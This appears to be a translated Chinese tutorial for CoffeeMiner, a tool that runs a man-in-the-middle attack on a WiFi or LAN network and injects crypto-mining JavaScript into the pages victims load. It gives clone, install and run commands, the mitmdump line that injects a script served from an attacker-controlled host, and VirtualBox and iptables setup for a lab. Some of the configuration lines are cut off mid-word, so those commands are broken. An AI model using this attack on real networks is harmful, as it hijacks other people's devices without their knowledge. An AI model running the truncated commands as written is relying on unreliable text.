加密货币矿工比上一年有所增加，近六亿台计算机在用户不知情的情况下通过其浏览器不断挖掘cryptoCurrency。但是，此 CoffeeMiner通过拦截流量和路由到注入的HTML页面进行挖矿而工作的方式有所不同，HTML页面包含JavaScript，这些JavaScript会强制连接到WiFi网络的所有设备为攻击者挖掘加密货币。

  

**概念：**

*   对所有选定的受害者执行一次MITM攻击
    
*   在受害者请求的所有HTML页面中注入js脚本
    
*   注入的js脚本包含一个加密货币矿工
    
*   连接到Lan网络的所有受害设备都将在挖矿中使用CoffeeMiner
    

  

**如何使用CoffeeMiner – WiFi MITM加密货币矿池**

![](../Images/1645e7c41c7f680ef7434c5cea5b80d0.png)

  

首先，我们将下载或Git CoffeeMiner。

  

| 1 || $ git clone https://github.com/arnaucode/coffeeMiner.git |
| --- | --- |

  

之后，我们将运行' install.sh'bash文件。

*   install.sh
    

| 1 || $ bash install.sh |
| --- | --- |

  

*   每行用一个IP编辑受害者.txt
    
*   使用coffeeMiner httpserver IP 编辑CoffeeMiner.py，第28行：
    

os.system("~/.local/bin/mitmdump -s 'injector.py 

http://10.0.2.20:8000/script.js' -T")

  

完成后，我们只需执行并运行该coffeeMiner.py文件。

*   执行coffeeMiner.py
    

| 1 || $ python3 coffeeMiner.py ipgateway |
| --- | --- |

![](../Images/53a8121f3462ee22f98740eae9da93d3.png)

**设置VirtualBox方案的说明**

在每台机器上，记住要设置dns服务器，例如，在/etc/resolv.conf中：

nameserver 8.8.8.8

  

**受害者**

*   网络适配器：
    
*   仅限主机的适配器
    
*   / etc / network / interfaces：
    

| auto loiface lo inet loopback auto eth0iface eth0 inet static    address 10.0.2.20    netmask 255.255.255.0    gateway 10.0.2.1 |
| --- |

**攻击者**

*   网络适配器：
    
*   仅限主机的适配器
    
*   / etc / network / interfaces：
    

| auto loiface lo inet loopback  
auto eth0iface eth0 inet static    address 10.0.2.10    netmask 255.255.255.0    gateway 10.0.2.1 |
| --- |

**网关**

*   网络适配器：
    
*   桥接适配器
    
*   仅限主机的适配器
    
*   / etc / network / interfaces：
    

| auto loiface lo inet loopback  
auto eth0iface eth0 inet dhcp  
auto eth1iface eth1 inet static    address 10.0.2.15    netmask 255.255.255. |
| --- |

**处理IPTABLES：**

| iptables --flushiptables --table nat --flus |
| --- |

**将网关计算机配置为路由器：**

| echo 1 > /proc/sys/net/ipv4/ip\_forward  
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
iptables -A FORWARD -i eth0 -o eth1 -j ACCEPTiptables -A FORWARD -i eth1 -o eth0 -j ACCEP |
| --- |
